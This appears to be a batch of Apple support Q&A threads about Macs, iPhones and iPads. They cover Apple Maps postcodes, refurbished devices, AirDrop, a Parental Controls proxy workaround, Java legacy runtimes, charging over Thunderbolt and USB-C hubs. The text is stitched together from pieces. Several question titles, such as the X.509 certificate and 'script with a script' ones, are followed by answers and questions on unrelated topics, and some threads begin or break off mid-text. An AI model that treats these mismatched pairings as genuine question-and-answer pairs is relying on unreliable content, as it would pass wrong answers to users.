distinction.\nIf I start typing an address on Church Street [not mine, it knows where I live, of course] but any other number along the road, then it's not even going to hone it to less than a screenful of alternatives until I start the postcode section, which will rapidly hone it to town, then district & finally the correct location.\nAmusingly [well, vaguely amusingly] my barber shop has the same address as I do; distinguishable only by the postcode.\nI can't really add any generalisation for outside the UK, as that's the only system I know - but you can test it for your own local 'postcode' structure, see below.\nA Postcode in the UK is a \"potential set of numbers in a given distance on a road [or roads - this changes depending on the population density].\" Those numbers fall inside that postcode whether or not they even exist, in case the buildings change over the years. Important & large organisations can have their own 'personal' Postcode - famously, BBC Radio 1 is W1N 4DJ although W1N is actually a valid postcode for where the office is - they couldn't have picked R4D 101 etc, it had to come from the pre-determined pool.  \nThe postcode is the only real stored reference for an Apple Map POI & especially once saved as a contact or favourite [other maps do it differently, but Apple Maps does it this way, even if you enter data in actual international mapping designations initially.] This is the limit of its resolution once saved. As a simple Dropped Pin it retains accuracy, but as soon as it's saved it loses that & drops back to 'postcode' as its finest granularity.\nYou can test this storage method & whether it also applies to your own country's 'postal code' system by the simple but tedious expedient of saving a location which is inside a geographically large single postcode, saving it as a Contact or Favourite then recalling it - it moves to the centre of the postcode, wherever you had set the POI initially.  \nThis is actually what I have always considered a major failing in Apple Maps & I've reported it many times, from both a user & beta tester perspective.\n", "Q: How to import X.509 certificates into MacOS?

By default, this is APFS, but it can be changed to \"APFS Case Sensitive\", which is presumable what you have already done.\nYou need to change the format to \"APFS\".

With iOS 12 being launched in September and iOS 12.1 being launched in late October - does this suggest the phone (which was sealed in plastic shrink wrap and sold as “new”), from a reputable UK wide chain retailer, has been pre-owned or tampered with in some way?\nHow else could it come to have iOS 12.1 on it?\nShould I be worried.\n\nA: It is not uncommon for sellers and manufacturers to open \"sealed\" products, update them, charge the battery, etc. and reseal them to sell as new.\nIn the US, it's perfectly legal to resell a previously opened product (and not as refurbished) provided that the process is conspicuous and documented.  It's likely the UK has a similar law.\nThere are steps you can take even if you have questions about the legitimacy of the product you purchase.  However, my best advice is that if you feel that packaging is suspicious, trust your instincts.  Return the product for replacement or refund.  That type of concern with always linger regardless of whether or not it's unfounded.\n\nA: It's possible that It could be a refurbished unit.\nYou will know by the different letter designation beginning your Model number:\nM – Brand new device, meaning the device was purchased new\nF – Refurbished device, meaning the device has been through refurbishing process\nN – Replacement device, meaning the originally bought device was replaced by this model likely due to a service request\nP – Personalized device with engraving, meaning the device was customized with an engraving on purchase\n\nThere will be little difference to a \"Brand New\" unit - you should still get your 1year AppleCare.\nCheck that here:\nhttps://checkcoverage.apple.com/gb/en/\nThe only thing you have to decide is if the device being \"New\" means anything to you and of course, whether or not you paid RRP for a refurb unit.\nHope this helps!\nEdited - Serial number written instead of Model number, edited to remove conjecture.\n", "Q: Chances Migration Assistant will improve performance of Air-2011? I need to improve performance of my Macbook Air mid-2011.\nI'm considering to re-install MacOS from the scratch using Migration Assistant for that purpose. I recently migrated from original 256GB SSD to a third-party 2TB (formatted and restored from Time Machine, which only marginally affected the performance, if at all); originally have max 4GB of RAM.\nHow likely this way will result in substantial improvement?\nIs there any way to estimate whether MA will help in my situation before actually performing a migration, maybe with some checks / analysis tools / stats of eg. Activity Monitor over an extended period of time?\n\nA: One thing you don't mention is how much RAM and how much storage you have.\nThe two things that effect the speed of a particular computer to a noticible extent are faster storage (moving from a rotational HD to an SSD, or to a faster SSD) and more RAM. The latter depends on how you use your Mac. If you keep lots of applications open and run applications that use lots of RAM (graphics, video and sound editing spring to mind) then more RAM will likely help.\nYour Mac, however is configured from Apple and not upgradeable so those avenues are closed to you. That severely limits your ability to enhance the performance of your Mac via hardware solutions.\nYou can certainly try other ways of reinstalling the o/s and migrating the settings and doing so MIGHT have a small impact on the speed of your Mac, but it is unlikely you will gain much from those exercises.\nI note that this Mac has either 2GB or 4GB of RAM. 4GB might be barely enough (depending on your use)  but if you have a 2GB model... well I'd probably sell it and get a newer one with 8GB of RAM. Again, a personal opinion, it might work for you but that is not a lot by today's standards.\nPersonally, I would recommend a couple of things.\n\n\n*\n\n*A system cleaner app. I use Onyx that basically cleans out all the caches and runs all the maintenance scripts. It can help with system slowness, depending on where the slowness is coming from. I run Onyx every few months just to keep my bits and bytes sparkly clean!\n\n*Check your startup items (System Preferences > users & Groups > Login Items) and remove them. You'll lose their functionality but gain back some RAM and CPU cycles.\n\n\nThere may also be things that start up with the system that are not there in login items. A/V apps, do this as do VPN apps and also MS Office. These apps have things running in the background at all times. Some you may want to remove. You'll have to look at the developer's website for instructions how.\nBut regardless of all of this and even if you try the alternative clean reinstall you mentioned I doubt that any of them will result in a substantial improvement.\n", "Q: Opening a script with a script?

In the workflow header I say that the Workflow receive current 'image files' in 'Photos.app + Finder.app' Please see picture below. \nThe result is that the new context item is shown in the Finder.app (at the bottom = \"Find Albums\") but not in the Photos.app as can be seen in the other pictures below. \n\n\n\nI don’t know how to save this script into Photos.app to get it to activate.\nWhat setting allows my script to be seen in Finder and not in Photos?\n\nA: As far as I know, applications handle the right-click context menu on their own and there is no way to modify it. The general way of registering a service or having an application add a context menu entry only works for Finder (possibly also for other system contexts, but not Photos), which allows extending the menu. \n\nA: Apple has recently released a Photo Editing type of App Extension, which allows apps to provide custom functionality within Photos.app itself.\n\n\n*\n\n*Edit photos with extensions on your Mac\n\n*Photo Editing App Extension\n\nA Photo Editing extension lets users edit a photo or video within the Photos app. After users confirm the changes they make in a Photo Editing extension, the adjusted content is available in Photos.

I am developing a web application for a client who is planning to use an iPad when interviewing staff (as part of the recruitment process).  Can I use Apple Pencil 2 to collect information in a web page?  Specifically:\n\n\n*\n\n*Can I use it to fill out a html <input> or <textarea> field?\n\n*Can I use it to create a file (which I would attach), i.e. a PDF, GIF, something like that?\n\n\nA: Yes, you can use the Apple Pencil 2 to collect information in a web page.\nYes, it can also be used to fill out <input> and <textarea> fields. However, it might not be in the manner that you imagine. If you're hoping that all browsers convert handwriting into computer text when you \"draw\" on top of an <input> - then you're unfortunately wrong. Instead you'll be able to use a virtual keyboard with the pen to enter text into <input> and <textarea> form fields.\nYes, you can use use Apple Pencil 2 to create files that can be \"attached\" (i.e. uploaded) from a web page. There's both built-in apps as well as third party apps that allows you to create PDFs, image files, etc. on iPads. These files could for example contain drawings made with the pencil. Browsers support the standard <input type=\"file\"> field for uploads on the iPad.\nIf you want the user to be able to use handwriting directly on your web page without having to create PDFs or image files, then you can use the <canvas> element. You can easily find many tutorials on how to use the <canvas> element along with a few lines of Javascript to convert touch events from the Apple Pencil 2 into drawings on the canvas (either simple line segments or more advanced bezier curves). This is commonly used to support collecting signatures with the Apple Pencil 2.\n\nA: These is a virtual keyboard that will recognise handwriting with the Pencil and put the text into any place you can use a keyboard. e. g. mazec http://www.product.metamoji.com/en/mazec/\nThis will allow text input anywhere but no change to management of graphics.\nThe one I use does not recognise all writing and have to rewrite several words.(I think the old Palm Pilot recognition was better even though you had to use its own style of writing.

How do I remove the digital write up protection from my card using my mac?\n\nA: Golden Rule #1\nAs soon as an SD card [or USB stick] starts to play up - bin it. \nThey're not worth the effort once they error. \nI go through literally hundreds of them for work. Low write count, high read count. \nIf they error once, they will error again. Quality control on them is, let's say… variable. \nSome of them have a controller chip that will permanently lock them to read only if they detect a write error, as a preservation measure. There is no way to unlock them once this happens.\nGolden Rule #2 \nDon't use them to store anything valuable. \nEdit:\nIf the data on an SD card was truly valuable, it is theoretically possible to replace the controller chip, or even directly access the memory itself. This service can be performed by data recovery specialists, but they charge a lot for their efforts & still can make no guarantees.  \nRules 1 & 2 are still 'best practise'\nVerbatim from my answer at https://superuser.com/a/854645/347380 \n", "Q: Why can't my wife's iphone see my phone on Airdrop when I set it to \"Contacts Only\" My wife and I both have Iphone 8 running 11.4 (or at least mine is 11.4)\nVery weird behavior that I noticed happened recently.  I usually set my Airdrop to \"Contacts Only\" and leave it as such.  I remember being able to send/receive photos or videos between our phones in the past using Airdrop.\nHowever, yesterday, I had to set my Airdrop to \"Everyone\" so her phone could see my phone to send photos/videos.  Why did the behavior change?  She is a contact in my contact list.  I even tested to make sure when I called, my contact name/photo pops up and vice versa.\n\nA: I just solved this problem after google brought me to this question. \nThis problem has been bugging me for months. \nMy wife and I couldnt airdrop to each other unless we set airdrop to everyone and then we could send if we showed up in the \"other people\" section when using airdrop. \nIn my case I we had been using one apple id across both our phones and after we setup an appleid for my wife there were some issues. \nI'm not sure if all of this is related but it seems that AirDrop is a feature of or at least linked to contacts. So after checking that all of our iCloud details were distinct I started to look at contacts. \nNot sure if this is directly related but her 'My Info' in Settings/Contacts was still set to me. So I fixed that. \nDid a restart of both hers and my phones. \nThen she had multiple contacts for me. I beleive this is due to her and I working at the same organisation and both our phones being managed by the corporate MDM. When trying to link the two different contacts it would show a third contact with one of her email addresses, like the second contact had some link to a third contact that I couldnt see in her contacts list. Seemed a bit like an errant record. So in the end, I deleted all  contacts entries for me from her phone and added myself back using the minimum appleid  email address and mobile phone number. \nI also deleted the instant messaging details for each other from both of our phones contacts. \nAfter this I got the 5 airdrop requests that I had tried to send to her contact from my phone. \nThis is a bit of a ramble and I'm not sure if all steps are required for others in this situation but figured more information for others struggling with this issue.\n", "Q: Screenshot with cursor I used to take tons of screenshots that included the cursor with SnapzXPro.

My router is running a proxy using Squid that works fine on the Mac's administrator account and a user account. When the user account has Parental Controls enabled the proxy fails and no sites are reachable.\nThis is a known problem first reported in 2008 where Parental Controls runs the httpsproxyd daemon which interferes with external proxy operation. The solution was to either disable httpsproxyd or httpd, as described here.\n\n\n*\n\n*MacWorld's MacOS X Hints\n\n\n*\n\n*Summary: Run \"sudo chmod a-x /usr/sbin/httpd\"\n\n*Result on my machine: Error \"chmod: Unable to change file mode on /usr/bin/httpd: Operation not permitted\"\n\n\n*Apple discussion forum\n\n\n*\n\n*Summary: Run \"sudo chmod a-x /System/Library/PrivateFrameworks/FamilyControls.framework/Versions/A/Resources /httpsproxyd\"\n\n*Result on my machine: File \"httpsproxyd\" does not exist in that location or anywhere else.\n\n\n\nAs both these approaches fail I'm looking for any other approaches to resolving this conflict where an account with Parental Controls enabled has issues using a proxy.\nA related issue regarding how the Parental Controls interfere with HTTP/HTTPS traffic was also asked here earlier in 2017 but was unanswered. I'm including the link as it may provide additional details relating to this problem.\n\nA: I've found a solution for this problem. Running proxy software on the Mac will override Apple's built-in proxy used for parental controls. In this case I used squid via the SquidMan package as follows:\n\n\n*\n\n*Install the SquidMan package to the administrator account. Ensure SquidMan is configured to run at startup.\n\n*In SquidMan's preferences enable use of a parental control proxy, and point it to your router that is running squid (at 192.x.x.x, port 3128).\n\n*In the controlled account configure the browser to use a proxy and point it to the one created by SquidMan (at localhost, port 8080)\n\n\nIn this way Internet access from the controlled account will be routed through SquidMan to the specified proxy coming from the router.\nOne caveat of bypassing the Apple proxy is that the Parental Controls will no longer keep a history of visited websites. However you can configure Squid on your router to keep access logs that provide much more information than Apple's parental controls are capable of.\n", "Q: How do I listen to music on my computer through my iPad? I have a MacMini with my music collection on the hard drive.  I'd like to play that through my iPad when I'm at home.  But I have one major issue: I'm on satellite internet with a limited bandwidth.  One month I got hit with an extra $200 bill because I left iTunes running and it wasted gigabytes of bandwidth \"updating\" the music on my iMac from the iCloud.  (I don't store my music on my iMac - it's all on a shared drive on my MacMini.)\nSo I don't want to go through iTunes to do this (and, after that experience, I never run iTunes on my iMac or MacMinis), since that means I'm streaming my collection from the iCloud servers and using bandwidth.\nI want to be able to make up playlists on my iPad (I'm okay with a 3rd party app) of the music files on the shared drive of my MacMini and play it back through my iPad, using wifi, but not using any internet bandwidth.\nHow can I make up playlists on my iPad for music on a shared drive on my LAN so I can use the playlists like I would normally use them?  (In other words, being able to pick out a playlist, shuffle play it, repeat it, and so on.)\n\nA: Here are a few possible solutions:\nPlex\nI haven't used this but it appears to do exactly what you ask for. Install the free server on the Mac and the (paid) app on the iPad. You don't need to sign up for a subscription and it says you don't even need to sign in to stream from a local server, which should help assure you that no streaming from the internet will take place.\nRogue Amoeba's Airfoil\nInstall Airfoil for Mac on the Mac Mini where your music is and Airfoil Satellite for iOS on the iPad. \nAirfoil is not free, but you can try it before you buy and it should work reliably and is well supported. It routes any audio source(s) you choose on the Mac to play simultaneously on one or more compatible destinations - so you can use any Mac audio player you like, including but not limited to iTunes. Airfoil Satellite has basic remote control capabilities for some applications such as iTunes and Spotify, but you would need something else to create and edit playlists - I'm pretty sure Apple's iTunes Remote can do this, for example, or if you use VLC on the Mac there's VLC Mobile Remote for the iPad.\nLogitech Media Server\nThe server you run on the Mac is free, on the iPad you would need the SqueezePad client app (paid). \nDLNA\nInstall a UPnP/DLNA media server such as Kodi (free) on the Mac and use a DLNA client app for iOS - I don't know which to recommend, but there are lots to choose from including some free ones.\niTunes\nYou say you don't want to use iTunes and iOS Music because of the risk of it using too much data. I'm not sure whether you're talking about iTunes on the Mac Mini downloading purchased or matched (if you have iTunes Match) tracks, or Music on the iPad streaming these tracks or playing from Apple Music (if you have Apple Music), but there are two ways you should be able to use Music on the iPad without this happening: \n\n\n*\n\n*Sync the music from iTunes on the Mac to the iPad via USB. You will need enough storage on the iPad to fit it! In Music on the iPad, make sure you only play from within the Downloaded Music section of your library.\n\n*Turn on Home Sharing on iTunes and only play from within the Home Sharing section of your library. I (and others) have never found Home Sharing to work reliably but feel free to try it.\n\n\nThe only problem with these two is if you accidentally play music from outside the Home Sharing or Downloaded sections of the library.\nBlock streaming traffic on your router\nA final suggestion, depending on what router and/or other equipment for the satellite internet connection you have: is there a setting you can make to block or throttle streaming audio traffic, and/or iTunes downloads? I don't know what servers, protocols or ports you would need to block but you might be able to get that answered with another question here.\n\nA: I do this using iTunes (I do not have apple music so there is no syncing to the cloud)\nIn iTunes on the Mac or pc turn on sharing in Preferences -> sharing -> Share library on my local network.  (So the option for sharing will not use the cloud)\nOn your iPad go to Settings->Music At the bottom is Home sharing - you need the same Apple Id that you use in iTunes (which does not have to be the same as that for iCloud)\nOn the ipad the mac's play lists appear in the submenu shared libraries at the bottom of the iPad library entries  and choose the name of the shared library.  \nSee Apple's documentation https://support.apple.com/en-gb/HT202190\n\nA: That's only a suggestion, but have a look at MusicStreamer.

So I believe that's another hurdle to be overcome.\n\nA: If you omit the size test\nfind f1 f2 f3 f4 -type f -exec mv {} f0/ \\;\n\nshould do the trick.\nWith a line count (so the file with more lines wins) and assuming that all files are text files it gets a bit more sophisticated:\nfind f1 f2 f3 f4 -type f -execdir sh -c \\\n    '[[ ! -e f0/\"$1\" || $(wc -l < \"$1\") -gt $(wc -l < f0/\"$1\") ]] && \\\n         mv \"$1\" f0/' _ {} \\;\n\nAnd finally if you want to compare for file size you need to replace both occurrences of wc -l < (including the <) with stat -f '%z'.\nPS: For hundred thousands of text files both find approaches will take a while. The second one using stat should be significantly faster than using wc though.\n", "Q: How do I right-click in iOS Safari to access website specific functionality? More and more desktop websites these days use javascript to offer specific website functionality which is available when you right-click on something. Often the developers create something that looks like a menu, but could be anything.\nIf I'm browsing desktop websites on iOS Safari (mainly iPad, but sometimes iPhone), how do I perform a right-click to display this functionality?\nFor a simple example, visit https://swisnl.github.io/jQuery-contextMenu/demo.html and try to display the menu under the box which states \"right click me\". On a desktop it's pretty obvious, but I cannot work out how to trigger it on an iPhone or iPad.\nI've tried tapping and holding but this either brings up the browser menu or the text selection tool. I've also tried double-tapping but that tends to zoom the page in and out.\n\nSide note: If you do a Google search for this, you'll find many posts from people assuming that you want to right-click to access functionality that desktop browsers typically offer (such as back, forwards, reload, save as, view page source and inspect element). This is not the functionality I'm interested in accessing.\n\nA: Since the original iPhone, mobile safari and iOS in general has multitouch and there is no concept of a cursor. The iOS idiom is direct manipulation of objects and not to have a floating object that exists to move content up when you drag something else down in the case of a scroll bar and thumb. The multitasking idiot is also shattered on iOS / iPadOS which also weakens the need for a cursor and window managers.\nRecent iOS and iPad OS do have all the cursor control you expect. Use a Magic Keyboard, Bluetooth trackpad, Bluetooth mouse or USB device and you get your cursor that meets your right click needs.\nFor most people, the initial concept of multitouch on the original iPhone explicitly chose to eliminate entirely the concept of a cursor: for which many people still will not forgive Apple. Macintosh was all about cursors, mice and contextual menus despite sticking to one button mice (for which many will never “forgive Apple” either.)\nWithout a pointing device, the OS still uses multitouch to forego “right click” emulation and instead recognize other gestures that use the up to 11 different point interactions that track surface area change in time as well as two-dimensional motion.\nThe core problem is that web sites not designed for touch fail to deliver a good experience. Whether we blame Apple for this or the web developers for this or the groups that design software tools for this is open to debate amongst even good intentioned professionals.\n\n*\n\n*There is no hover if you don’t have one pointer - so all the hover to show details falls flat\n\n*There is no control / right shift / option / mofifier click to map to a pointer that doesn’t exist - so your use case simply fails to exist.\n\nSome things do translate well:\n\n*\n\n*Mouse down event can be processed when multitouch shows a tap (finger down and no large movement)\n\n*Mouse up event can be processed when multitouch shows a finger up (no more contact in the region of the initial touch or tracked moving touch)\n\n*Multiple finger touch can sometimes map as option click.\n\nSorry to say there simply isn’t a mouse or pointer on iOS, but that’s kind of the summary. I’m not saying anyone here is wrong, just explaining what happened and that there may be two or more sides with differing goals that can yield to really bad implementations of a web design.\n", "Q: Launch Apple Music radio station directly from command line I'd like the most direct way, on a Mac, to launch an Apple Music \"radio\" station e.g. \n\n\n*\n\n*via the command line, without having to manually navigate to the radio tab in iTunes, waiting for it to load, scrolling to find the station etc.  \n\n*avoid having to load a URL in Safari first, then wait for iTunes to load (annoying there always seems to be a few seconds delay between the webpage loading and iTunes navigating to the stream).\n\n\nI attempted to do it with AppleScript.\nThe link to stations (get it via right click and Share Station) is in this format:\nhttps://itunes.apple.com/gb/station/classical/ra.123456789\n(I've obfuscated the numeric ID, just in case it's unique to the logged in user).\nWhenever I tell iTunes to open the actual URL, instead what it does is open the last \"ordinary\" (non-Apple) station I played. \n[AppleScript]\ntell application \"iTunes\" to open location \"https://itunes.apple.com/gb/station/classical/ra.123456789?ign-mscache=1\"\n\nYet if you look at the webpage the http:// URL gives you (the Connecting to the iTunes Store one) there doesn't seem to be anything different/special in the body onload javascript.\n\nA: You don't need AppleScript - can do it from the commandline directly with the right URI.\nopen \"itmss://itunes.apple.com/us/station/listen-in-apple-music/idra.985499994?cmd=AddStation\"\n\nYou're calling itmss:// because you need to hit iTunes itself.\nThen, replace the code into the idra.XXXXXXXXX bit.

I'm hoping that might be referring to this issue (I filed an issue a few weeks ago at https://feedbackassistant.apple.com/, so that may have prompted them to look into it, though they haven't responded to it).\nI'll update this answer if I see the problem again after the update.\nUPDATE: I'm still seing the problem in 10.14.6 (as well as OP who commented below), so this is unfortunately not the solution.\n", "Q: I have Java 8. An app wants Java 6 (legacy one). Can I avoid that? My government made a Java app to submit tax documents.\nThat app, it's actually a very outdated version of Eclipse.\nWhen I run this ugly mess, I get a dialog that prompts me to install Java SE 6 (Legacy) from Apple.\nI'd like to avoid that, for security issues, and also because I don't want to mess my Java installation\nHow could I force it to run on my Java 8 jvm?\nThe app is this: https://telematici.agenziaentrate.gov.it/Main/Desktop.jsp\n\nA: You most likely can not avoid this. The app you needs to use is built to run on the Java SE 6 framework. Java 8 is not backwards compatible, so you cannot \"force\" this app to run on Java 8. The only way to avoid installing the Java 6 SE components is if you can somehow avoid using this particular app.\nYou do not want to install using the Java installer found on the Oracle website. This will result in you having multiple copies of Java on your system, and it will be a mess.\nFollow the link in the notice you get, (I think it's this https://support.apple.com/kb/dl1572?locale=en_US) it will take you to an Apple download of a very specific set of \"Java SE 6 Legacy runtime components\". This can exist alongside your Java 8 installation and is used by certain outdated software (I used to have to install this to use an older version of Adobe Creative Suite before I updated to the CC version).\n** I admit I'm not 100% sure that the SE 6 Legacy components are compatible with Mojave, but I think that they are and that there was maybe a notice that Mojave would be the last compatible version of macOS.\n\nA: Like most of the answers on the web around this message dialog, the answer from @Morgan Rodgers might be correct in the case that the application really does have a specific need for that ancient version of Java. However, for many applications, a current/modern version of Java will work just fine except that they are wrongly configured. \nAt least on Mavericks 10.9 through Catalina 10.15, you can edit the JVM capabilites to correctly reflect what your Java 10, 11 etc can do in this file:\n/Library/Java/JavaVirtualMachines/<your modern java version>/Contents/Info.plist\n\nYou will need to replace the section around line 27 which looks like this:\n<key>JVMCapabilities</key>\n    <array>\n        <string>CommandLine</string>\n    </array>\n\nwith the correct set of capabilities:\n<key>JVMCapabilities</key>\n    <array>\n        <string>JNI</string>\n        <string>BundledApp</string>\n        <string>WebStart</string>\n        <string>Applets</string>\n        <string>CommandLine</string>\n    </array>\n\nAs 1 mentions, the editing may need to be done via text editor using a temporary copy, which is moved back into place using sudo. Once copied back, don't forget to check the timestamp and content of the updated file reflect your edit and reboot.\n", "Q: How to charge MacBook Pro quickly from an iMac? I am charging a MacBook Pro using a Thunderbolt 3 cable plugged into an iMac. This charging speed is exceptionally slow. The image shows 5+ hours to charge the laptop.\n\nI am using:\n\n\n*\n\n*2018 MacBook Pro 13\" with Touch Bar\n\n*2017 Retino 4K 21.5-inch iMac\n\n*Apple Thunderbolt 3 (USB-C) Cable (0.8m)\n\n\nThis cable costs $39 retail. At this price I am expecting better performance for charging than what I'm getting here. How could I diagnose this issue?\n\nA: According to Apple the best way to charge your MacBook Pro is with the included AC adapter. They don't mention plugging into an iMac specifically, but based on your report of a long predicted charging time, I'm going to guess that iMacs don't put out as much energy over thunderbolt as the AC adapter.\nAccording to this page on the Thunderbolt 3 Cable, it is definitely  the iMac's power output, not the cable that is limiting the charging speed. \n\nA: \nThis cable costs $39 retail. At this price I am expecting better\n  performance for charging than what I'm getting here. How could I\n  diagnose this issue?\n\nThere's nothing to diagnose because everything is operating as it should.\nThe problem is not the cable (it's irrelevant, actually) nor the iMac as it's only capable of delivering up to 15W of power via the Thunderbolt 3 ports. From Apple's Support Document.\n\nYour iMac also has two Thunderbolt 3 (USB-C) ports....Thunderbolt 3 also supports USB 3.1 Gen 2 connectivity at up to 10Gbps, and can supply 15W of power per port to external devices.\n\nEmphasis mine\nYour MacBook Pro requires a 61W charger so, in essence, you're using a charger that can only supply a quarter (25%) of what you're MacBook Pro requires.  Therefore, the long charging time is accurate and to be expected.\nBottom line - use the charger that came with your MacBook Pro.\n", "Q: What is a good way to move my MacBook life to a temporary computer, and back to primary computer? I use my MacBook Pro extensively, for work and pleasure. I have a lot of apps and settings. I have a ton of data in my Calendar app and Contacts app. I have a sequence of year-based project directories in ~/Documents/Projects/2019/, ~/Documents/Projects/2018/. I keep backups on two different drives.\nAnd this MacBook Pro is broken, so I have to repair it. Repairs will take a week. I don't want to stop all that activity for a week. I want to move enough of my apps and settings and data to a temporary computer that I can keep working, then move back to my main computer when it is repaired. \nWhat is an effective way to stop changes on my main computer, transfer all of my state to the temporary computer so that I can work without disruption, then transfer all of my state back to the main computer when it returns? \nNote that it's important to have a clean way to be able to keep accumulating project data on the temporary computer, and to move all that project data seamlessly back to the main computer when it returns.\nI have a file server, which keeps archives of the past year's project directories. Let's assume that I can copy ~/Documents/Projects/2018/ and earlier to that server, and delete them from my main computer. Thus what I really want to transfer is what is in my home directory outside this year's projects, and apps and settings, and the accumulated project data from the time I am on the temporary computer.\nHere are some assumptions to clarify the problem:\n\n\n*\n\n*I have access to the temporary computer for enough overlap time (a day? a week?) before and after, to perform the transfer\n\n*The main computer still functions. It can do its part in the transfer. I can delay the repair until a convenient time.\n\n*I have access to plenty of storage locally\n\n*I want to avoid cloud storage in favour of local storage which I control\n\n*I am willing to buy utility software if it helps\n\n*I am comfortable running sysadmin tools, using the command line, etc.\n\n*I need a way to delete all my data from the temporary computer when I am done\n\n*It would be nice, but not essential, to delete the data on my main computer while it is in for repair\n\n\nThe temporary computer might be a rental, in which case let's assume I could install or delete anything I want, because they will re-image the system when they get it back. Or, the temporary computer might be one of my spare laptops, in which case I can create a new user account for temporary use, and delete it after, but I can't completely blow up the contents of the disk.\nI especially hope for answers which describe something you actually do, and which has worked well for you.\n\nA: Make a complete copy of the primary computer's hard drive using Carbon Copy Cloner to an external SSD / hard drive. Boot the secondary computer from this new disk (turn off computer, connect drive, hold option when restarting to select it as the boot disk). Booted from the external drive, the secondary computer will be just like the primary one now, same files and configuration.\nWhen the primary computer comes back, use CCC again to copy the data from the external drive back to its internal hard drive.\n", "Q: Trying to remove \"FDisk_partition_schem\" from USB drive I'm trying to reset this USB drive so that I can use the 64.2 GB of space.\nI've tried diskutil unmount and it didn't work. \n\n\nA: I fiqured it out. I used this:\ndiskutil eraseDisk JHFS+ Emptied /dev/disk3\n\n", "Q: Is it possible to copy the remaining files of a (possibly corrupted) hard drive to an external hard drive? Let me explain. After trying to update my Mac Sierra (it was a 2013 Macbook Air model) to Mac High Sierra, the update failed (\"MacOS could not be installed on your computer\"), and I was unable to start up the laptop without encountering that error screen. I did find a \"Startup Disk\" option, but Macintosh HD wasn't there (there were no options at all). I tried using Disk Utility, found that Macintosh HD was unmounted, and attempted to use First Aid to repair any issues, but that failed. Then, I tried booting the computer in Safe Mode, using Terminal (my \"r\" key shorted out, so cmd+r on booting wasn't going to work - I had to copy and paste an \"r\" from the error log to place in Terminal). \nUpon checking, there was no available Time Machine device or directory I could use to save my computer, so that was out of the question. I intended to try to re-download and reinstall macOS, but then I found that my Macbook Air suddenly would not connect to my wi-fi, blocking me from that option indefinitely. From checking on Macintosh HD using Disk Utility, it appeared that my files still existed from the amount of storage taken up, but there was seemingly no way to access them or boot the Macbook Air from that HD.\nMy final hope is this: I have a 2TB external hard drive I could copy the existing files of the Macintosh HD to, and then access those files from a new Macbook Air (2018, 10.14.1, Mojave) entirely. Can this be done? \n\nA: Assuming you haven't already solved this, each of the following options should work.  Also not sure if you went through with a new computer:\n\n\n*\n\n*Start up in the recovery partition of an external bootable drive (especially if you have a USB recovery installer of Mac OS - highly recommended). Use disk utility to restore your external hard drive from the internal drive of the old MacBook Air. Once completed you should have an exact clone to hook up to your new MacBook Air or investigate a fresh install of the old one.\n\n*This is a slight variation, but if you haven't already got a USB recovery installer, you could partition your external drive, make the first partition into the recovery installer, and use the second partition to restore into a clone.\n\n*Start in disk utility on your 2018 MacBook Air (or a friend's Mac). Use a Thunderbolt 2 to 3 adapter and start your 2013 MacBook Air in Target disk mode (hold T on startup). If your hard drive doesn't mount, hopefully it appears in the device list for you to access.\n\n*Dismantle the old MacBook Air and place the hard drive into an external enclosure. Hopefully you have a friend with an enclosure you can borrow. If you buy a full upgrade kit, you may be able to salvage the old MacBook Air as well!\n", "Q: How to reset or rebuild application search database in ios? I am having a strange problem on ios.

There seem to be many USB-C adapter hubs, which convert USB-C to other types, and HDMI. When searching for \"USB-C hub\" you normally see adapters. However, I actually don't want a USB adapter, as they all seem to have only a single USB-C port; effectively just a pass through. I want a USB-C to USB-C hub so I can charge the iPad and connect a USB-C device at the same time. Does such a product exist?\n\nEdit: Maybe this?\n\n\nA: The answer here is it depends.\nThe device you have pictured above is designed to be connected into a computer (Mac or PC, it doesn't matter.)\nUnless otherwise stated that the port supports Power Delivery (PD), it will only supply a limited amount of power.  In one recent answer I wrote, the iMac will only supply 15W of power.  However, you'll have to get the exact power specs for your particular machine.\nAll devices have some sort of power draw; even a flash disk has some power draw, usually in the milliamp range (200 mA or .2A).  However, if you exceed the power limitation of what the port can supply, it will end up disconnecting devices.\nAssuming that you're using an iMac that can deliver up to 15W, the iPad has a requirement of 10W meaning you have 5W extra to spare.  You should be able to use (not charge) another USB device like a flash drive (5V * .2A = 1W)\n\nA: \nI want a USB-C to USB-C hub so I can charge the iPad and connect a USB-C device at the same time. Does such a product exist?\n\nNo, or at least it's unlikely they exist.\nThe USB-C and USB 3.x specs left it ambiguous at best how a hub with multiple USB-C ports should act.  A \"USB-C hub\" could be like an Ethernet hub that allows multiple computers to all plug in and network with each other.  USB 3.x wasn't really built for this, although it didn't prevent or disallow it.  USB 1.1 and USB 2.0 used \"hub\" more like we think of a \"dock\" now, as in there is one host and only one host with all other devices plugged in being peripherals to it.\nA USB 3.x USB-C hub would likely be confusing to many users since the function and behavior of each port is not defined explicitly by the USB 3.x specification.    There are devices that have many USB-C ports on them, these are not USB 3.x hubs, these will adhere to the Thunderbolt spec or just be doing their own thing.  Unfortunately there's far too many products out there that do their own thing and bring amusement or tears to people like me that are asked to solve computer issues.\nBecause USB 3.x didn't define how a USB-C hub should act we get what are most often called docks and dongles.  Something with a captive USB-C cable (captive as in cannot be unplugged without breaking something) and two USB-C receptacles could likely pass the USB specifications but one receptacle would almost certainly have to be defined for USB-PD power input and the other for a USB peripheral.  Doing otherwise would make the internals rather complex and therefore expensive.  This would no doubt be confusing and frustrating for many.  Calling something like this a \"hub\" isn't exactly correct, or wrong either.\nWhat is certainly defined by the USB specs is a USB-C dock, a device that plugs into one host with a captive cable, has only one other USB-C port for power only, and any of a number of other (not USB-C) ports.  USB-C adapters, cables, and dongles are defined in the spec and are readily found on the market, they are not complicated by making a connection to more than one other port that may or may not be USB.\nUSB4 may resolve this ambiguity on how a USB-C hub works, and again Thunderbolt already defined how a USB-C hub works.  A Thunderbolt hub plugged into a USB 3.x host may not act in any predictable manner.  What is predictable is no permanent damage would be done, USB-C ports are smart enough to prevent that.\nOh, and I know there are adapters out there that will allow a USB-C device to plug into a USB-A port.  These are dangerous as they defeat what is supposed to protect USB devices from damaging each other.  One thing that the people behind the USB spec did to protect USB devices from damage is made logical decisions on what are \"legal\" cables and adapters.  Getting a USB-C dongle with a USB-A port then putting an adapter in the USB-A port to make it another USB-C port would be tempting way to solve the problem but also tempts fate by someone accidentally plugging a power supply into this USB-C to USB-A adapter.  This could feed power in to a port designed for power out.  This could let the smoke out of your valuable iPad, rendering it not so valuable any more.\nI understand your frustration.  I too sought something that could multiply the number of USB-C ports on my iDevices.  There is no solution that is both inexpensive and safe.  Not yet anyway, USB4 might fix this once we see products hit the market.\n\nA: I found this on Amazon today. It has a \"Power delivery input\" (PD in) port. I will order it and give it a 